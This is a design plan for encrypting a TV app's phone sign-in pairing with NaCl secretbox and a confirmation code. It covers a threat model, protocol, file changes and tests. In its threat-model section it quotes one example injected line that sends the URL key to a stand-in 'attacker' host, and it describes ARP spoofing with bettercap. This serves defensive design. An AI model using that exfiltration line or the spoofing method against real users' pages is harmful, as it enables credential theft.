# Encrypted phone sign-in: plan

Plan for the `TODO.md` item "Encrypt the phone form against passive Wi-Fi sniffing", plus a
confirmation code that the phone and TV must both show. Covers `src/pairing.rs`,
`src/pairing.html`, `src/signin.html`, `src/api.rs` and `frontend/src/ProfileGate.tsx`.

## Threat model

| Who | Today | After this plan |
|---|---|---|
| **Passive sniffer** on the Wi-Fi (sees every packet) | Reads email, password and 2-step code in plain text | Sees only the token and ciphertext. Can't decrypt, forge, replay, or move a message to another step |
| **Someone else with the link** (photo of the QR code, a tab left open on another phone, a housemate who scans it first) | Can type into the sign-in window | Their phone's code doesn't match the TV's, so the user picks **No** and the link is replaced. Nothing is typed until the TV confirms |
| **Active attacker** on the LAN (ARP spoofing, rogue access point) who rewrites the page | Reads everything | **Still reads everything.** Their copy of the page reads the key from the `#fragment` and shows the "right" code, because the code is shown by JavaScript they control |

The last row is a hard limit of a browser page served over plain HTTP: the phone can only trust
code that the network delivered. Only HTTPS with a trusted certificate or a native phone app would
fix it, and both are out of scope. The README and `plan.md` keep saying "trusted network only".

### How the active attack works
1. **They get in the middle.** The attacker, on the same network, uses ARP spoofing (for example
   `bettercap`), a rogue access point or a hacked router, so traffic to `:7879` goes through them.
2. **The phone loads the page.** It asks for `GET /p/<token>`. The key isn't in the request,
   because browsers never send the `#fragment`.
3. **They change the page.** They pass the request to the real TV and add one line to the page
   before passing it on, for example `fetch('http://attacker/?k=' + location.hash)`.
4. **The phone runs their version.** It runs in the page that the `#key` URL opened, so it reads
   the key exactly as the real script does.
5. **Everything else works normally.** They pass every request through and decrypt it as it goes
   by, or their script sends what's typed straight to them. The TV makes the confirmation code and
   the phone decrypts it, so the codes match and every backend check passes. The attacker never
   needs to see the TV, and nothing looks wrong on either screen.

**What they need:** to be on the network (they know the Wi-Fi password or control the router)
and to act during the few minutes a sign-in is open, since port 7879 is closed the rest of the
time. 2-step codes work once and Google uses them right away, which limits the damage, but the
password still leaks. For a home network with people you trust, the risk is small. On shared or
public Wi-Fi it's real, so the phone page and the README say: **"On shared Wi-Fi, use the TV
keyboard instead."**

**What would stop it, if it's ever needed:**
| Option | Notes |
|---|---|
| HTTPS with a real certificate | A Let's Encrypt certificate (DNS-01 challenge) for a domain you own, such as `tv.<your domain>`, pointing at the TV's LAN IP, the way Plex uses `*.plex.direct`. The phone browser then checks the page is real. This is the only browser-based fix. It needs a domain and certificate renewal |
| Native phone app | Trusts the key in the QR code directly, as Signal does. Too much work for this project |
| TV keyboard | Nothing crosses the network. Always available as the fallback |

### Why the TV side isn't encrypted
- The TV UI and `signin.html` get the code and URL from the main API over `127.0.0.1` only (the
  server binds to localhost and checks `Host`). Those packets never reach the Wi-Fi.
- The screen has to be readable. That only people in the room can see it is what makes the code
  and the `#key` URL safe to show.
- The only copy of the code that crosses the network is the encrypted `hello` reply.
- The text typed into Firefox (the email shows on screen, the password as dots) has to be plain
  text for Google. It's the same as typing on the TV keyboard.

## How it works

```
TV (CouchTube UI / signin.html)             Phone browser                     Backend :7879
  QR = http://<ip>:7879/p/<token>#<key>
                                     ──scan──▶ GET /p/<token>      (no key: browsers never send the #fragment)
                                               read key, then strip it from the address bar
                                               phone id P = 16 random bytes (kept in sessionStorage)
                                               POST /hello  box(key, {phone: P, seq: 0}) ──▶ bind phone P,
                                                                                            make code 482 913
                                               ◀── box(key, {code: "482913"})
  "A phone connected. Does it show 482 913?"   shows "482 913"
  [Yes, that's my phone] [No]
  Yes ──▶ POST /api/pairing/confirm {code}  (main API, localhost only)                     confirmed = true
                                               POST /email  box(key, {phone, step, seq, text}) ──▶ check, type it
```

### Key and URL
- `Pairing::start` reads 32 more random bytes from `/dev/urandom` for the session key, next to
  the token. The key lives only in `Session` memory and ends with the session.
- `info()` builds `http://<ip>:<port>/p/<token>#<key as 64 hex chars>`. That is about 125
  characters, which still fits easily in the QR code at its current size. The URL shown as text
  under the QR code includes the key too; that's fine because it's only visible on the TV.
- Never log the URL. Today nothing logs it; keep it that way and add a comment where it's built.
- Hex everywhere (token, key, nonce, ciphertext), as the token already is, so no base64 crate is needed.

### Crypto
- **Phone:** tweetnacl-js 1.0.3 (`nacl.min.js`, public domain), vendored as
  `src/vendor/nacl.min.js` and inlined into the phone page. `crypto.subtle` doesn't exist on plain
  HTTP, but `crypto.getRandomValues` does, and tweetnacl uses it for nonces. Check the vendored
  file's SHA-256 against the npm tarball and note it in a comment.
- **Backend:** the RustCrypto `crypto_secretbox` crate (`XSalsa20Poly1305`), which matches
  `nacl.secretbox`. Pin an exact version that is at least two weeks old.
- Each message is `{"n": <24-byte nonce, hex>, "c": <ciphertext, hex>}`. The phone makes a fresh
  random nonce for every message.
- The page is served as one HTML response: `pairing.rs` puts `nacl.min.js` into `PAGE` at a
  placeholder once (a `LazyLock<String>`), so the phone makes no second request.

### What each encrypted message contains
```json
{"phone": "<P hex>", "step": "password", "seq": 3, "text": "..."}
```
The backend checks, in this order, **before** `claim()` uses up a try:
1. It decrypts with the session key. On failure it returns `400 "this link is out of date: scan the QR code again"`. A forged or garbage request never uses up a try.
2. `phone` is the bound, **confirmed** phone. Otherwise it returns `403 "confirm the code on the TV first"` or `409 "another phone is connected"`.
3. `step` matches the route. This stops a sniffer from replaying the password ciphertext to `/email`, which would type the password where it is visible on screen.
4. `seq` is higher than the last one accepted for this session. This stops replays: a captured "password" request can't be resent to type it again.

Replies stay plain JSON. They hold only status and error text, and an active attacker could fake
them anyway. The one exception is the `hello` reply, which carries the confirmation code and is
encrypted.

### Confirmation code
- **`POST /p/<token>/hello`** (LAN): body is `box({phone, seq: 0})`. Until the phone is confirmed,
  each hello **replaces** the bound phone and makes a new random 6-digit code. The reply is
  `box({code})`.
  - The latest phone always wins. The TV always shows the code for the phone that is currently
    bound, so if someone else says hello after the user, the codes differ and the user picks **No**.
  - After confirmation, a hello from another phone gets 409. A hello from the confirmed phone
    (after a page reload, with P from `sessionStorage`) gets the same code back.
- **`GET /p/<token>/status`** (LAN): `{"state": "waiting" | "confirmed" | "none"}`, with no
  secrets. The phone polls it once a second until confirmed, so it can say "Now press Yes on the TV".
- **`GET /api/pairing`** (main API) also returns `"code": "482913" | null` and `"confirmed": bool`.
- **`POST /api/pairing/confirm {"code"}`** (main API, so localhost only, and the phone can never
  confirm itself): it succeeds only if `code` matches the bound phone's current code. This stops a
  race where the code changes just as the user presses **Yes**. Otherwise it returns 409 and the TV
  shows the new code.
- **`POST /api/pairing/reject`** (main API): ends the session and starts a new one with a new
  token and key (`Pairing::reset`, which keeps the window's `pid`). The QR code on the TV changes,
  and the old link, including any copy of it, is dead.
- Show the code in groups of three (`482 913`) on both screens, with `aria-label` reading the digits.

### TV side
- **`ProfileGate.tsx`**: poll `/api/pairing` (about once a second) while the QR code is shown.
  Once `code` is set and not confirmed, show the code with **Yes, that's my phone** and **No**
  buttons (`data-nav`, so the arrow keys and Enter work). Once confirmed, show "Phone connected".
- **`signin.html`**: the same prompt and buttons, because users may scan from the Firefox start
  page. The requests go to the same localhost API it already reads.
- After Firefox moves on to Google, the TV can't show the prompt. So the phone page says up front:
  "Confirm the code on the TV before you continue to Google." The normal order is scan, confirm,
  then continue to Google.

### Phone page (`pairing.html`)
1. On load, read `location.hash`. If it's missing or not 64 hex characters, show "Scan the QR code
   on the TV (the link must include everything after #)" and stop. Otherwise keep the key in a
   variable and call `history.replaceState` to remove the fragment from the address bar and history.
2. Load P from `sessionStorage`, or make a new one; send `hello`; show the code large; poll `status`.
3. Keep the forms disabled until the state is `confirmed`, so errors stay rare.
4. Each submit sends `box({phone, step, seq: ++seq, text})`. Keep `seq` in `sessionStorage` too,
   so a reload doesn't reuse an old number.

## Changes by file
| File | Change |
|---|---|
| `Cargo.toml` | add `crypto_secretbox` |
| `src/pairing.rs` | `key`, `phone: Option<Phone { id, code, confirmed, last_seq }>` on `Session`; `hello`, `status` routes; decrypt and check before `claim`; `confirm`, `reset`; key in `info()` |
| `src/vendor/nacl.min.js` | new, vendored tweetnacl 1.0.3 |
| `src/pairing.html` | fragment handling, hello and code, encrypted steps, "on shared Wi-Fi use the TV keyboard" line |
| `src/api.rs` | `code` and `confirmed` in `GET /api/pairing`; `POST /api/pairing/confirm` and `/reject` |
| `src/signin.html`, `frontend/src/ProfileGate.tsx`, `frontend/src/api.ts` | confirmation prompt |
| `plan.md`, `README.md`, `TODO.md` | describe the encryption and its active-attacker limit, with the shared Wi-Fi advice; tick the TODO |

## Tests
- **Rust unit tests** (`pairing.rs`):
  - A fixed test vector made with tweetnacl in Node decrypts correctly. This proves the two libraries agree.
  - A wrong key or a garbage body doesn't use up a try.
  - A replayed `seq` is rejected.
  - A ciphertext for `password` sent to `/email` is rejected.
  - Steps before confirmation get 403.
  - Confirming with an old code gets 409.
  - A second phone after confirmation gets 409.
  - A reload of the confirmed phone gets the same code back.
  - `reset` changes both the token and the key.
- **Manual test:** sign in with a test account while running
  `sudo tcpdump -A -i any port 7879 | grep -i '<test password>'` on the TV. Nothing should match.
  Then scan with a second phone before confirming, check that the codes differ, press **No**, and
  check that the QR code changes and the old link gives 404.
